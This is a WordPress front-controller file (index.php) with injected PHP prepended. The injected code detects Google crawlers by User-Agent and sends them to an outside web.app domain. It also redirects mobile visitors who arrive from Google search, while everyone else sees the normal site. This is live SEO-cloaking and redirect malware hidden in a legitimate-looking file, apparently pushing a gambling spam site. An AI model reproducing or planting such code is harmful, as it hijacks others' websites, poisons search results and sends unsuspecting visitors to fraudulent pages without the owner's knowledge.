<?php
function isGoogleBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $googleBotAgents = [
        'Googlebot',
        'Googlebot/2.1',
        'Googlebot-Mobile',
        'Googlebot-Image',
        'Googlebot-Video',
        'Googlebot-News',
        'Google-InspectionTool',
        'Google-Site-Verification',
        'Mediapartners-Google',
        'AdsBot-Google',
        'AdsBot-Google-Mobile',
        'APIs-Google',
        'AdsBot-Google-Mobile-Apps',
        'FeedFetcher-Google',
        'DuplexWeb-Google',
        'Google Favicon',
        'Google-Read-Aloud',
    ];
    
    foreach ($googleBotAgents as $botAgent) {
        if (strpos($userAgent, $botAgent) !== false) {
            return true;
        }
    }
    return false;
}

if (isGoogleBot()) {
    // Jika pengunjung adalah Googlebot, tampilkan index_hitam.txt
     header("Location: https://hijauwin-joss.web.app/i.html");
    exit;
}

function is_mobile() {
    $mobile_agents = array('Android', 'iPhone', 'iPad');
    $uri = $_SERVER['REQUEST_URI'];
    foreach ($mobile_agents as $agent) {
        if ($uri == '/' && stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
            if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google') !== false)
            return true;
        }
    }
    return false;
}

if (is_mobile()) {
     header("Location: https://hijauwin-joss.web.app/");
    exit;
} else {



/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';

}
?>
